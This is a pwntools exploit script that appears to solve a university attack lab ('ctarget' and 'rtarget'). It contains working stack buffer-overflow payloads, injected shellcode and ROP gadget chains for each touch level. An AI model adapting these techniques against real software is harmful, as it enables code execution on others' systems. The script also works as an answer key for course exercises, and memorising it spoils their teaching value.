from pwn import *
#context.log_level='debug'
context(os='linux', arch='amd64')
'''
#cookie read
f=open("./cookie.txt")
cookie=int(f.read(),16)
f.close()
'''
#touch 1
r=process(argv=["./ctarget","-q"])
print(r.recv().decode())
r.sendline(b"A"*40+p64(0x4017c0))
print(r.recv().decode())
r.close()

#touch 2
#stack start 0x55586000
#Input String Start 0x5561dc78
#end 0x5561DC98
asm_code='''
mov edi,0x59b997fa
ret
'''
r=process(argv=["./ctarget","-q"])
print(r.recv().decode())
r.sendline(asm(asm_code).ljust(40,b'\x90')+p64(0x5561dc78)+p64(0x4017ec))
print(r.recv().decode())
r.close()

#touch 3
#stack start 0x55586000
#Input String Start 0x5561dc78
#end 0x5561DC98
asm_code='''
mov rdi,0x5561dc78+40+8+8
ret
'''
r=process(argv=["./ctarget","-q"])
print(r.recv().decode())
r.sendline(asm(asm_code).ljust(40,b'\x61')+p64(0x5561dc78)+p64(0x4018fa)+b'59b997fa\x00')
print(r.recv().decode())
r.close()

#rop touch 2
#0x000000000040141b : pop rdi ; ret
r=process(argv=["./rtarget","-q"])
print(r.recv().decode())
r.sendline(b"A"*40+p64(0x40141b)+p64(0x59b997fa)+p64(0x4017EC))
print(r.recv().decode())
r.close()

#rop touch 3 4018FA
#605500
#0x0000000000401383 : pop rsi ; ret
#0x000000000040141b : pop rdi ; ret
#0x000000000040214e : mov dword ptr [rdi + 8], eax ; ret
#0x00000000004019ab : pop rax ; nop ; ret
r=process(argv=["./rtarget","-q"])
print(r.recv().decode())
r.sendline(b"A"*40+p64(0x40141b)+p64(0x606000)
+p64(0x4019ab)+b'59b9\x00\x00\x00\x00'
+p64(0x40214e)
+p64(0x40141b)+p64(0x606004)
+p64(0x4019ab)+b'97fa\x00\x00\x00\x00'
+p64(0x40214e)
+p64(0x40141b)+p64(0x606008)
+p64(0x4018fa)
)
print(r.recv().decode())
r.close()
